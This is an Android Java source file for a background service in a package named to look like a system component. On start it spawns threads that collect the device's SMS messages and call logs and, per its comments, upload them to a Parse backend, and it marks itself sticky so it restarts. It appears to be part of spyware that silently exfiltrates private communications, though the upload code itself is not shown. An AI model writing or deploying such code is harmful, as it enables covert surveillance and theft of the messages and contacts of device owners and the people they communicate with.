package com.android.service_getdata.Service;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

import com.android.service_getdata.Threads.DataSenderThread;
import com.android.service_getdata.Threads.PickUpDataThread;

public class SendDataService extends Service {

    Thread threadSms, threadCallLogs;

    public SendDataService() {
    }
    @Override
    public void onCreate() {
        super.onCreate();
        //creating sms sender thread
        DataSenderThread dataSenderThreadSms = new DataSenderThread(getContentResolver(),DataSenderThread.SMS_THREAD);
        threadSms = new Thread(dataSenderThreadSms);

        //creating call log sender thread
        DataSenderThread dataSenderThreadCallLogs = new DataSenderThread(getContentResolver(),DataSenderThread.CALLLOGS_THREAD);
        threadCallLogs = new Thread(dataSenderThreadCallLogs);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        sendDataToParse();
        return START_STICKY;
    }

    private void sendDataToParse()
    {
        //sending messages to Parse
        threadSms.start();

        //sending call log data to parse
        threadCallLogs.start();
    }
    private final Handler mCallhandler = new Handler(){
        public void handleMessage(Message msg) {
        }
    };


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
